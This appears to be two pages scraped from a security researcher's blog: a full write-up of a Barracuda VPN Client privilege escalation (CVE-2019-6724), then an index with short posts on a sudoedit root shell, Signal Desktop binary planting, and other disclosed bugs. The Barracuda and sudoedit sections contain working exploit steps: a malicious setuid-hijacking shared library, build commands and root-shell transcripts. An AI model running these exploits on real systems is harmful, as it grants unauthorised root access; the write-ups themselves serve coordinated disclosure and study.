=== Content from blog.mirch.io_8ffe6fc6_20250121_032045.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS — February 14, 2019](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/ "CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS")

[![](https://blog.mirch.io/wp-content/uploads/2019/02/centos-barracuda-vpn-client-privesc.png?w=712)](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/ "CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS")

## [CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/)

[February 14, 2019May 3, 2019](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/ "9:31 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

The barracudavpn component of the Barracuda VPN Client prior to version 5.0.2.7 for Linux, macOS, and OpenBSD runs as a privileged process and can allow an unprivileged local attacker to load a malicious library, resulting in arbitrary code executing as root.

This post will walk through the process on how I found and exploited the vulnerability on Linux. The full PoC will  also work on macOS. When researching for potential vulnerabilities with privileged binaries a test system should be used to avoid causing damage or negative impacts.

The first step is to identify a privileged binary. I normally use the [find(1)](http://man7.org/linux/man-pages/man1/find.1.html) command. This example displays setuid binaries under the /usr/local directory. I generally use the -xdev option to avoid traversing other files systems such as NFS. It’s better to be intentional when using find instead of blindly using / for the target path. The -ls option is a nice built-in feature to automatically display the long list of file attributes. Finally, stderr is redirected to /dev/null to discard errors caused by insufficient permissions.

```
[user1@localhost ~]$ find /usr/local -xdev -perm -4000 -ls 2>/dev/null
68555095 4548 -rwsr-xr-x   1 root     root      4653080 Oct 29 02:25 /usr/local/bin/barracudavpn

```

An alternative to using find is to inspect the files installed by a specific package. Often times files are installed to multiple locations so listing out the files contained by a package is helpful. This example uses the rpm command to list files installed in verbose format for the barracudavpn package.

```
[user1@localhost ~]$ rpm -q -l -v barracudavpn
drwxr-xr-x 2 root root 0 Oct 29 02:25 /etc/barracudavpn
-rwsr-xr-x 1 root root 4653080 Oct 29 02:25 /usr/local/bin/barracudavpn

```

There are several things I look for when attacking privileged binaries. If source code is not available my goto utilities for this investigation is tracing system calls using [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html) and tracing library calls using [ltrace(1)](http://man7.org/linux/man-pages/man1/ltrace.1.html). On macOS I use [Dtrace](https://en.wikipedia.org/wiki/DTrace). Here is a list of a few common vectors. This post will focus on the #2 – loading of libraries.

1. Execute external commands
2. Loading of libraries
3. File paths
4. Environment variables
5. Pipe or store output
6. Configuration files
7. Debug / undocumented features

When executing strace or ltrace as an unprivileged user, privileges will be dropped. Sometimes this is ok but generally the command will exit with an error. When attempting to execute strace as a low privileged user it results in the following error. The error message is not always as obvious as the barracudavpn binary.

```
# Options
#   -o output file with a PID suffix
#   -ff follow forks
#   -s increase maximum string size to print

[user1@localhost ~]$ strace -o /tmp/vpn.trace \
                            -ff \
                            -s 1000 \
                            /usr/local/bin/barracudavpn
```
![barracudavpn-noroot-error](https://blog.mirch.io/wp-content/uploads/2019/02/barracudavpn-noroot-error.png?w=712)

Error because privileges were dropped

To get around this error, run either utility as root using the -u option. After adding this option the application opens without error.

```
[root@localhost ~]# rm -f /tmp/vpn.trace* # cleanup residual traces
[root@localhost ~]# strace -u user1 \
                           -o /tmp/vpn.trace \
                           -ff \
                           -s 1000 \
                           /usr/local/bin/barracudavpn

```
![barracudavpn-noerror](https://blog.mirch.io/wp-content/uploads/2019/02/barracudavpn-noerror.png?w=712)

Application after running strace as root with -u user1

I wanted to see if any libraries were loaded by default at runtime so I exited the application to review the trace file. A simple grep looking for the string “.so” works. barracudavpn attempted to load a non-existent library named libcavium.so from /opt/phio/libs64/engines.

```
[root@localhost ~]# grep \\.so /tmp/vpn.trace.20255
open("/opt/phion/libs/engines/libcavium.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

A low privileged user cannot normally write to /opt so we’ll have to see if we can influence the leading path. This could potentially be achieved by manipulating environment variables, configuration options, or command parameters.

To check for environment variables I ran ltrace to show getenv calls but received the following error.  It turns out the binary is [statically](https://en.wikipedia.org/wiki/Static_build) linked so ltrace will not work.

```
[user1@localhost ~]$ ltrace /usr/local/bin/barracudavpn 2>&1| grep getenv
Couldn't find .dynsym or .dynstr in "/proc/3079/exe"

[user1@localhost ~]$ file /usr/local/bin/barracudavpn
/usr/local/bin/barracudavpn: setuid ELF 64-bit LSB executable,
  x86-64, version 1 (GNU/Linux),
  statically linked,
  for GNU/Linux 2.6.32,
  BuildID[sha1]=34b314b85afe2908266dc8f4229415df09f0e61f, stripped
```

This is an easy check with ltrace but since that failed I decided to run the strings utility and look for an upper case strings. The binary is 4.5 MB so paging through strings output was not practical. A good place to start was looking around the area of the strings I had found in the previous step. The OPENSSL\_ENGINES string jumped out at me  as a potential environment variable. A quick google search shows that this is part of the OpenSSL [engine](https://www.openssl.org/docs/man1.1.1/man1/engine.html) library and most likely the code is from [eng\_list.c](https://github.com/openssl/openssl/blob/3c120f91656f90a9a3b629bb6ea9d5a1f0d4d678/crypto/engine/eng_list.c#L317-L330) and was compiled with ENGINESDIR=/opt/phion/libs/engines.

```
[root@localhost ~]# strings /usr/local/bin/barracudavpn|grep -C5 /opt/phion/libs/engines
OpenSSL DH Method
dh_lib.c
Diffie-Hellman part of OpenSSL 1.0.1u 22 Sep 2016
eng_list.c
OPENSSL_ENGINES
/opt/phion/libs/engines
DIR_LOAD
DIR_ADD
eng_init.c
eng_ctrl.c
eng_pkey.c

```

A simple test is to set the environment variable to a unique value. I used /foobar for this test and re-ran barracudavpn. The open() call confirms the environment variable can be changed to a path we control to load the library. If privileges are not dropped prior to the loading of this library we can achieve arbitrary code execution as root. I could look for set\*uid calls but as a simple test I will just set the variable and see what happens. The link step on macOS is slightly different. View the full PoC linked below for an example.

```
[root@localhost ~]# export OPENSSL_ENGINES=/foobar
[root@localhost ~]# timeout 10s strace -u user1 -ff /usr/local/bin/barracudavpn 2>&1|grep '\.so'
open("/foobar/libcavium.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

At this point I am confident that a library of my choice could be loaded. I created a simple woot() function to execute a shell.

```
#include
#include
#include

void woot(){
  setreuid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}
```

Build the shared library and write it in the foobar directory. Notice the -init,woot flag. This specifies what function to use as the constructor and the default name is \_init. Details on how this works can be found in section 5.2 of the Program-Library-HOWTO [miscellaneous](http://tldp.org/HOWTO/Program-Library-HOWTO/miscellaneous.html) page.

```
[user1@localhost ~]$ mkdir foobar
[user1@localhost ~]$ gcc -fPIC -Wall -o woot.o -c woot.c
[user1@localhost ~]$ gcc -Wall -shared -Wl,-soname,libcavium.so -Wl,-init,woot -o foobar/libcavium.so woot.o
[user1@localhost ~]$ export OPENSSL_ENGINES=foobar

```

Execute /usr/local/bin/barracudavpn to spawn a root shell.

```
[user1@localhost ~]$ id
uid=1000(user1) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[user1@localhost ~]$ /usr/local/bin/barracudavpn
sh-4.2# id
uid=0(root) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2#

```

The full PoC for Linux and macOS can be found on my Github page [CVE-2019-6724.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-6724.sh).

## Summary

When a privileged binary loads an external library, care must be taken to ensure the library cannot be loaded from an untrusted location. As a low privileged user, look for writeable paths where libraries are loaded from. Dynamic libraries can be loaded from static paths, paths based on environment variables, configuration options, or command parameters. Also keep in mind that this behavior might not be documented. Strace and ltrace are standard tools that I use identify libraries loaded dynamically by the target program.

I appreciate the partnership with Dave Farrow – Senior Director, Information Security – Barracuda Networks.

## References

* PoC: [CVE-2019-6724.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-6724.sh)
* <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6724>
* [macOS Barracuda VPN Client Release Notes](http://campus.barracuda.com/product/networkaccessclient/doc/78154147/release-notes-barracuda-vpn-client-for-macos/)
* [Linux Barracuda VPN Client Release Notes](http://campus.barracuda.com/product/networkaccessclient/doc/78154149/release-notes-barracuda-vpn-client-for-linux/)

## Timeline

2019-01-02 Report sent to vendor via [BugCrowd](https://bugcrowd.com/barracuda)

2019-01-03 Vendor acknowledges report

2019-01-07 Vendor meeting regarding coordinated disclosure

2019-01-17 Vendor releases fixes

2019-01-23 Mitre assigned CVE-2019-6724

2019-02-14 Public Disclosure

### Share this:

* [Twitter](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Linux](https://blog.mirch.io/category/linux/)Tags: [exploit](https://blog.mirch.io/tag/exploit/), [Linux](https://blog.mirch.io/tag/linux/)

## Post navigation

[Linux persistence idea – using group passwords](https://blog.mirch.io/2019/01/09/linux-persistence-idea-using-group-passwords/)[Write-up for CVE-2018-15332 , CVE-2018-5529 , CVE-2018-5546 , CVE-2019-6617](https://blog.mirch.io/2019/05/21/243/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F02%252F14%252Fcve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F02%252F14%252Fcve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos%252F)
  + [Copy shortlink](https://wp.me/paoR5j-39)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/195)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_13739932_20250121_032101.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance – Part 1 — May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance – Part 1")

## [Exploiting Kaseya Unitrends Backup Appliance – Part 1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability — January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS Vulnerability — December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

## [Pi-hole Patches Critical Stored XSS Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation — September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi Routers — September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi Routers")

## [Critical Vulnerabilities Discovered in MoFi Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> — TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of Privilege — March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 – “We are aware of the situation and working on the next steps”.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.  This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> — Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability — December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster — November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

